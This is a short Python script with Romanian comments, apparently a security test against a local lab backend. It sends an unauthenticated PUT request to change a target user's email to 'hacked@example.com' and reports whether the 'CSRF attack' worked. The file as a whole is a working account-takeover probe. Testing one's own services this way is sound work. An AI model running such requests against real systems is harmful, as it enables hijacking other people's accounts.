import requests

# 🔗 Endpoint vulnerabil unde poate fi exploatat CSRF
CSRF_URL_TEMPLATE = "http://backend:8080/api/cf/users/{}/email"

# 🔢 ID-ul utilizatorului țintă (poate fi schimbat cu unul existent în baza de date)
TARGET_USER_ID = 1  # Poți testa cu alți utilizatori

# 📩 Adresa de email la care dorim să schimbăm (simulăm atacul)
NEW_EMAIL = "hacked@example.com"

def test_csrf():
    print("[🔍] Testare atac CSRF...")

    # Formăm URL-ul cu ID-ul utilizatorului țintă
    csrf_url = CSRF_URL_TEMPLATE.format(TARGET_USER_ID)

    # 📨 Payload-ul nostru malițios
    payload = {"email": NEW_EMAIL}

    # ❌ Trimiterea requestului de tip PUT fără token CSRF sau autentificare validă
    response = requests.put(csrf_url, json=payload)

    if response.status_code == 200:
        print(f"[✔] Atac CSRF reușit! Email-ul utilizatorului {TARGET_USER_ID} a fost schimbat la: {NEW_EMAIL}")
    else:
        print(f"[❌] Atac CSRF eșuat! Status Code: {response.status_code}")
        print(f"🛑 Răspuns server:\n{response.text}")

    print("[🔥] Testarea atacului CSRF s-a încheiat.")

if __name__ == "__main__":
    test_csrf()
